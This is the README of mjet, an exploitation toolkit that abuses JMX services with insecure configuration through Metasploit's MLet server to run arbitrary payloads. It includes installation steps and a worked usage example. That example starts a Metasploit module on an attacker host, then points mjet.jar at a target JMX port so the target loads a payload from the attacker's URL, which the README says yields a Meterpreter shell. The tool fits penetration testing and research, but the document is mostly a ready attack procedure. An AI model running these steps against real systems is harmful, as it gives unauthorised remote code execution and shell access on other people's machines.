# mjet
Mogwai Java Management Extensions (JMX) Exploitation Toolkit

mjet is a tool that can be used to protect insecure configured JMX services. It is based on
the blog post "Exploiting JMX-RMI" from Braden Thomas/Accuvant "http://www.accuvant.com/blog/exploiting-jmx-rmi" 
and can be used to execute arbitrary Metasploit payloads on the target system.

Mjet was originally planned to be a complete attack toolkit, however we noticed that the Metasploit Github repository contains 
a pull request which will provide basic Java RMI/serialization support in native ruby. This is awesome and removes the Java 
dependency. So we stopped developing this tool  and focus on Metasploit instead.

mjet consists of the following parts:
- A metasploit module which emulates a "mlet Server". This is basically a web server which hosts a html file that contains a mlet tag
- A ManagedBean that is changed by the mlet server module to include the selected payload
- A jar archive that is used to contact the insecure JMX service.


### Installation (with the github version of Metasploit)
- Copy the "MBean" folder to "data/java/metasploit"
- Copy java_mlet_server.rb to "modules/exploits/multi/misc/"

### Usage 

The example uses following systems:
attacker: 192.168.178.1
target: 192.168.178.200, JMX service running on tcp port 1616

- Configure/start the metasploit module "java_mlet_server". The module will run as a background job
```
msf > use exploit/multi/misc/java_mlet_server
msf > set LHOST 192.168.178.1
msf > set SRVHOST 192.168.178.1
msf > set URIPATH /mlet/
msf > run
```

Use mjet.jar to connect to the vulnerable JMX service and provide the URL to the MLet Web server...
```
java -jar mjet.jar -t 192.168.178.200 -p 1616 -u http://192.168.178.1:8080/mlet/
```

and enjoy your meterpreter shell :-)

